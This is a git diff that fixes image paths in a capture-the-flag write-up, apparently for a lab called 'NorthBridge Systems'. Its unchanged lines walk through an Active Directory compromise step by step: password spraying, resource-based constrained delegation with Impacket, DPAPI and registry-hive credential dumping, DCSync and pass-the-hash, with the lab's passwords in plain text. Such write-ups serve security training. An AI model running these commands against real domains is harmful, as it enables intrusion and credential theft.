@@ -2,7 +2,7 @@
 
 ## NorthBridge Systems (Hard)
 
-![image.png](<../.gitbook/assets/image (1).png>)
+![image.png](<../../.gitbook/assets/image (1).png>)
 
 ### Objective / Scope
 
@@ -166,7 +166,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 #### Generating host files
 
-![image.png](<../.gitbook/assets/image 1 (3).png>)
+![image.png](<../../.gitbook/assets/image 1 (3).png>)
 
 * Added the above hosts to `/etc/hosts`
 
@@ -183,13 +183,13 @@ nxc rdp NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@'
 nxc winrm NORTHJMP01.northbridge.corp -u  _securitytestingsvc -p '4kCc$A@NZvNAdK@' 
 ```
 
-![image.png](<../.gitbook/assets/image 2 (2).png>)
+![image.png](<../../.gitbook/assets/image 2 (2).png>)
 
 * We have `Network shares` that is worthy being looked at later.
 
 #### Testing other services
 
-![image.png](<../.gitbook/assets/image 3 (2).png>)
+![image.png](<../../.gitbook/assets/image 3 (2).png>)
 
 * Can `rdp`
 
@@ -202,7 +202,7 @@ nxc rdp NORTHDC01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@'
 nxc winrm NORTHDC01.northbridge.corp -u  _securitytestingsvc -p '4kCc$A@NZvNAdK@' 
 ```
 
-![image.png](<../.gitbook/assets/image 4 (1).png>)
+![image.png](<../../.gitbook/assets/image 4 (1).png>)
 
 * We do not have interesting shares here yet.
 
@@ -233,7 +233,7 @@ nxc smb  NORTHJMP01.northbridge.corp -u _securitytestingsvc -p '4kCc$A@NZvNAdK@'
 
 #### Enumerating other users
 
-![image.png](<../.gitbook/assets/image 5 (3).png>)
+![image.png](<../../.gitbook/assets/image 5 (3).png>)
 
 We have interesting output in our description `PAM-Managed KDC Service Accounts`
 
@@ -253,46 +253,46 @@ Could be a pivot point.
 
 #### Enumerating the `Network shares` from `NORTHJMP01`
 
-![image.png](<../.gitbook/assets/image 2 (2).png>)
+![image.png](<../../.gitbook/assets/image 2 (2).png>)
 
 ```bash
 smbclient \\\\10.1.136.48\\"Network Shares" -U _securitytestingsvc
 
 ```
 
-![image.png](<../.gitbook/assets/image 7 (4).png>)
+![image.png](<../../.gitbook/assets/image 7 (4).png>)
 
 * I was unable to view the share although i had READ permissions
 *   When we tested for other services, we had a `Pwn3d!` on `rdp` and lets straight away authentic
 
-    ![image.png](<../.gitbook/assets/image 3 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 3 (2).png>)
 
     ```bash
     xfreerdp3 /v:10.1.136.48 /u:_securitytestingsvc /p:'4kCc$A@NZvNAdK@' +clipboard /dynamic-resolution /drive:$(pwd),share
     ```
 
-    ![image.png](<../.gitbook/assets/image 9 (3).png>)
+    ![image.png](<../../.gitbook/assets/image 9 (3).png>)
 
-![image.png](<../.gitbook/assets/image 10 (2).png>)
+![image.png](<../../.gitbook/assets/image 10 (2).png>)
 
 * We have 2 interesting directories here. `Network Shares & Scripts`
 * Lets see what's inside of both
 
 `Network Shares`
 
-![image.png](<../.gitbook/assets/image 11 (3).png>)
+![image.png](<../../.gitbook/assets/image 11 (3).png>)
 
 * We have what seems to be a password `1rUlHB95TVA2I&BCve` and we can try to password spry.
 
-![image.png](<../.gitbook/assets/image 12 (2).png>)
+![image.png](<../../.gitbook/assets/image 12 (2).png>)
 
 * This PowerShell script (`Get-DomainObjectDACL.ps1`) checks for **dangerous ACEs (permissions)** on the **Domain Object** in Active Directory
 
-![image.png](<../.gitbook/assets/image 13 (3).png>)
+![image.png](<../../.gitbook/assets/image 13 (3).png>)
 
 * User & System Provisioning Checklist
 
-![image.png](<../.gitbook/assets/image 14 (2).png>)
+![image.png](<../../.gitbook/assets/image 14 (2).png>)
 
 *   We can test for ADCS vulnerabilities
 
@@ -300,15 +300,15 @@ smbclient \\\\10.1.136.48\\"Network Shares" -U _securitytestingsvc
     certipy-ad find -u '_securitytestingsvc@northbridge.corp' -p '4kCc$A@NZvNAdK@' -dc-ip 10.1.11.70 -vulnerable 
     ```
 
-    ![image.png](<../.gitbook/assets/image 15 (2).png>)
+    ![image.png](<../../.gitbook/assets/image 15 (2).png>)
 
     * we did not find any, so this is now out of the way for now.
 
 `Scripts`
 
-![image.png](<../.gitbook/assets/image 16 (1).png>)
+![image.png](<../../.gitbook/assets/image 16 (1).png>)
 
-![image.png](<../.gitbook/assets/image 17.png>)
+![image.png](<../../.gitbook/assets/image 17.png>)
 
 `Password.txt` file contains a DPAPI-encrypted Secure String
 
@@ -317,14 +317,14 @@ smbclient \\\\10.1.136.48\\"Network Shares" -U _securitytestingsvc
 
 ```
 
-![image.png](<../.gitbook/assets/image 18.png>)
+![image.png](<../../.gitbook/assets/image 18.png>)
 
 * The backup process uses a **service account** that is a member of the **Backup Operators** group, requiring careful credential handling.
 * A Task Scheduler job still uses this same account until it can be replace
 
-![image.png](<../.gitbook/assets/image 19.png>)
+![image.png](<../../.gitbook/assets/image 19.png>)
 
-![image.png](<../.gitbook/assets/image 20.png>)
+![image.png](<../../.gitbook/assets/image 20.png>)
 
 *   In `C:\Scripts\Server Build Automation` we gathered some interesting findings
 
@@ -335,7 +335,7 @@ smbclient \\\\10.1.136.48\\"Network Shares" -U _securitytestingsvc
         nxc smb 10.1.136.48 -u users.txt -p 'yf0@EoWY4cXqmVv' --continue-on-success
         ```
 
-        ![image.png](<../.gitbook/assets/image 21.png>)
+        ![image.png](<../../.gitbook/assets/image 21.png>)
 
         * Perfomed password spraying and indeed the creds can authenticate user `_svrautomationsvc`
           * Interestingly, `erhodes` has a `STATUS_ACCOUNT_RESTRICTION` .This can mean that the password _is correct_, but logon is restricted (logon hours, workstation restrictions.
@@ -350,7 +350,7 @@ We can use the provided creds `_svrautomationsvc:yf0@EoWY4cXqmVv` or `_securityt
 nxc ldap NORTHDC01.northbridge.corp -u '_svrautomationsvc' -p 'yf0@EoWY4cXqmVv' --bloodhound --collection All --dns-server  10.1.11.70
 ```
 
-![image.png](<../.gitbook/assets/image 22 (1).png>)
+![image.png](<../../.gitbook/assets/image 22 (1).png>)
 
 #### Bloodhound enumeration
 
@@ -362,15 +362,15 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
 
 All domain Admins
 
-![image.png](<../.gitbook/assets/image 23.png>)
+![image.png](<../../.gitbook/assets/image 23.png>)
 
 * `erhodesT0` is also a member of Domain Admins
 
-![image.png](<../.gitbook/assets/image 24.png>)
+![image.png](<../../.gitbook/assets/image 24.png>)
 
 * `_securitytestingsvc` doesn't have any interesting groups
 
-![image.png](<../.gitbook/assets/image 25.png>)
+![image.png](<../../.gitbook/assets/image 25.png>)
 
 * `_svrautomationsvc` has an outbound control to `NORTHJMP01.northbridge.corp`
 * The user `_SVRAUTOMATIONSVC@NORTHBRIDGE.CORP` has `write rights` on all properties in the User Account Restrictions property set. Having write access to this property set translates to the ability to modify several attributes on computer NORTHJMP01.NORTHBRIDGE.CORP, among which the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is the most interesting.
@@ -385,13 +385,13 @@ First, if an attacker does not control an account with an SPN set, a new attacke
 addcomputer.py -method LDAPS -computer-name 'RedBlue2$' -computer-pass 'RedBlue777' -dc-host NORTHDC01.northbridge.corp  -domain-netbios northbridge.corp 'northbridge.corp/_svrautomationsvc:yf0@EoWY4cXqmVv'
 ```
 
-![image.png](<../.gitbook/assets/image 26 (1).png>)
+![image.png](<../../.gitbook/assets/image 26 (1).png>)
 
 * This means the account we are using has already reached the **maximum number of computers it’s allowed to join to the domain**
 * By default, **any authenticated user** can add **10** machines to AD (ms-DS-MachineAccountQuota = 10). Some environments set it to **0**, meaning _no_ normal user can add computers.
 *   Let me take you back to the findings we made above
 
-    ![image.png](<../.gitbook/assets/image 20.png>)
+    ![image.png](<../../.gitbook/assets/image 20.png>)
 
     * This script confirms exactly _why_ the `_svrautomationsvc` account exists, **what OU it can write to.**
     * The script assumes it is being executed by an account with **delegated permissions to create computer objects within the Servers OU.**
@@ -402,7 +402,7 @@ addcomputer.py -method LDAPS -computer-name 'RedBlue2$' -computer-pass 'RedBlue7
 bloodyAD --host NORTHDC01.northbridge.corp -d northbridge.corp -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv' add computer --ou 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp' 'RedBlue2' 'RedBlue777'
 ```
 
-![image.png](<../.gitbook/assets/image 28 (2).png>)
+![image.png](<../../.gitbook/assets/image 28 (2).png>)
 
 We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's [rbcd.py](http://rbcd.py/) script can be used for that purpose:
 
@@ -412,7 +412,7 @@ rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action '
 rbcd.py -delegate-from 'RedBlue2$' -delegate-to 'NORTHJMP01$' -dc-ip '10.1.11.70' -action 'write' 'northbridge.corp'/'_svrautomationsvc':'yf0@EoWY4cXqmVv'
 ```
 
-![image.png](<../.gitbook/assets/image 29 (1).png>)
+![image.png](<../../.gitbook/assets/image 29 (1).png>)
 
 And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's [getST.py](http://getst.py/) example script can be used for that purpose.
 
@@ -420,20 +420,20 @@ And finally we can get a service ticket for the service name (sname) we want to 
 getST.py -spn "cifs/NORTHJMP01.northbridge.corp" -impersonate erhodesT0 'northbridge.corp/RedBlue2$:RedBlue777' -dc-ip 10.1.11.70
 ```
 
-![image.png](<../.gitbook/assets/image 30 (2).png>)
+![image.png](<../../.gitbook/assets/image 30 (2).png>)
 
 * Failed to impersonate with `erhodesT0`.
 * We looked into other Admin accounts we can try to impersonate.
 
-![image.png](<../.gitbook/assets/image 23.png>)
+![image.png](<../../.gitbook/assets/image 23.png>)
 
-![image.png](<../.gitbook/assets/image 32 (1).png>)
+![image.png](<../../.gitbook/assets/image 32 (1).png>)
 
 ```bash
 getST.py -spn "cifs/NORTHJMP01.northbridge.corp" -impersonate RHALLT1 'northbridge.corp/RedBlue2$:RedBlue777' -dc-ip 10.1.11.70
 ```
 
-![image.png](<../.gitbook/assets/image 33 (1).png>)
+![image.png](<../../.gitbook/assets/image 33 (1).png>)
 
 * Now that we have the `.ccache`, we can use it to access the CIFS service (SMB share) on `NORTHJMP01.`
 
@@ -447,7 +447,7 @@ export KRB5CCNAME=RHALLT1@cifs_NORTHJMP01.northbridge.corp@NORTHBRIDGE.CORP.ccac
 nxc smb 10.1.136.48 --use-kcache
 ```
 
-![image.png](<../.gitbook/assets/image 34 (1).png>)
+![image.png](<../../.gitbook/assets/image 34 (1).png>)
 
 #### Remote Command Execution
 
@@ -457,11 +457,11 @@ python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
 
 ```
 
-![image.png](<../.gitbook/assets/image 35 (1).png>)
+![image.png](<../../.gitbook/assets/image 35 (1).png>)
 
 ### User flag
 
-![image.png](<../.gitbook/assets/image 36 (1).png>)
+![image.png](<../../.gitbook/assets/image 36 (1).png>)
 
 ## Escalating to `NORTHDC01`
 
@@ -472,9 +472,9 @@ python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
 
 `Scripts`
 
-![image.png](<../.gitbook/assets/image 16 (1).png>)
+![image.png](<../../.gitbook/assets/image 16 (1).png>)
 
-![image.png](<../.gitbook/assets/image 17.png>)
+![image.png](<../../.gitbook/assets/image 17.png>)
 
 `Password.txt` file contains a DPAPI-encrypted Secure String
 
@@ -483,16 +483,16 @@ python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
 
 ```
 
-![image.png](<../.gitbook/assets/image 18.png>)
+![image.png](<../../.gitbook/assets/image 18.png>)
 
 * The backup process uses a **service account** that is a member of the **Backup Operators** group, requiring careful credential handling.
 * A Task Scheduler job still uses this same account until it can be replace
 
-![image.png](<../.gitbook/assets/image 37 (1).png>)
+![image.png](<../../.gitbook/assets/image 37 (1).png>)
 
-![image.png](<../.gitbook/assets/image 38 (1).png>)
+![image.png](<../../.gitbook/assets/image 38 (1).png>)
 
-![image.png](<../.gitbook/assets/image 39 (1).png>)
+![image.png](<../../.gitbook/assets/image 39 (1).png>)
 
 #### Dumping DPAPI Creds to get Creds for `_backupsvc`
 
@@ -500,7 +500,7 @@ python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
 nxc smb 10.1.136.48 --use-kcache --dpapi
 ```
 
-![image.png](<../.gitbook/assets/image 40 (1).png>)
+![image.png](<../../.gitbook/assets/image 40 (1).png>)
 
 #### Testing the creds for `_backupsvc`
 
@@ -508,7 +508,7 @@ nxc smb 10.1.136.48 --use-kcache --dpapi
 nxc smb 10.1.136.48 -u _backupsvc -p 'REDACTED'
 ```
 
-![image.png](<../.gitbook/assets/image 41.png>)
+![image.png](<../../.gitbook/assets/image 41.png>)
 
 * Now that our creds are valid, we now need to dump Registry hives using nxc module for Backup operator to extract creds
 
@@ -516,7 +516,7 @@ nxc smb 10.1.136.48 -u _backupsvc -p 'REDACTED'
 nxc smb 10.1.11.70 -u _backupsvc -p 'REDACTED' -M backup_operator
 ```
 
-![image.png](<../.gitbook/assets/image 42.png>)
+![image.png](<../../.gitbook/assets/image 42.png>)
 
 *   For some reason, the SAM and SECURITY hives were successfully downloaded but not the SYSTEM
 
@@ -526,18 +526,18 @@ nxc smb 10.1.11.70 -u _backupsvc -p 'REDACTED' -M backup_operator
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 43.png>)
+    ![image.png](<../../.gitbook/assets/image 43.png>)
 
     ```bash
     secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 44.png>)
+    ![image.png](<../../.gitbook/assets/image 44.png>)
 
     * Retrieved `N**orthdc01$` machine account password\*\*.
 
-![image.png](<../.gitbook/assets/image 45.png>)
+![image.png](<../../.gitbook/assets/image 45.png>)
 
 * We can use `NORTHDC01` domain controller machine account to perform a DCSync attack.
 
@@ -547,13 +547,13 @@ nxc smb 10.1.11.70 -u _backupsvc -p 'REDACTED' -M backup_operator
 secretsdump.py 'northbridge.corp/NORTHDC01$@northdc01.northbridge.corp' -hashes :'REDACTED' -just-dc-user Administrator
 ```
 
-![image.png](<../.gitbook/assets/image 46.png>)
+![image.png](<../../.gitbook/assets/image 46.png>)
 
 ```bash
 nxc smb 10.1.11.70 -u Administrator -H 'REDACTED'
 ```
 
-![image.png](<../.gitbook/assets/image 47.png>)
+![image.png](<../../.gitbook/assets/image 47.png>)
 
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
@@ -564,6 +564,6 @@ python3 /usr/share/doc/python3-impacket/examples/smbclient.py \
 
 ### ROOT FLAG
 
-![image.png](<../.gitbook/assets/image 48.png>)
+![image.png](<../../.gitbook/assets/image 48.png>)
 
-![image.png](<../.gitbook/assets/image 49.png>)
+![image.png](<../../.gitbook/assets/image 49.png>)
